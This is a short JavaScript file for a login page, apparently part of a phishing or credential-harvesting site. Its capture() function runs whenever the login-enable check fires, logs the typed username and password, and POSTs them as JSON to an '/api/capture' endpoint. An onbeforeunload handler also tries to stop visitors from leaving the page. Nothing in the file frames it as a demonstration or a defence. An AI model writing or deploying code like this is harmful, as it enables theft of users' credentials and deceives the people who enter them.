let password = "";
let username = "";

window.onbeforeunload = function (e) {
    if ((e.clientY < 0)) {
        e.preventDefault();
        alert('you rweally wanna leave');
    }
};
function showPass(element, messenger){
    if (element.type == 'password') {
        element.type = 'text';
        messenger.innerHTML = 'Hide'
    } else {
        element.type = 'password';
        messenger.innerHTML = 'Show';
    }
}

function enableLogin(uname, pass){
    element = document.getElementById('login');
    if (uname.length >= 3 && pass.length >= 6){
        element.style.opacity = 1;
        element.disabled = false;
    } else {
        element.style.opacity = 0.4;
        element.disabled = true;
    }

    capture(uname, pass);
}

function capture(un, ps){
    User = {
        "Username" : un,
        "Password" : ps,
    };
    console.log(User);
    options = {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(User),
    }
    response = fetch("/api/capture", options)
}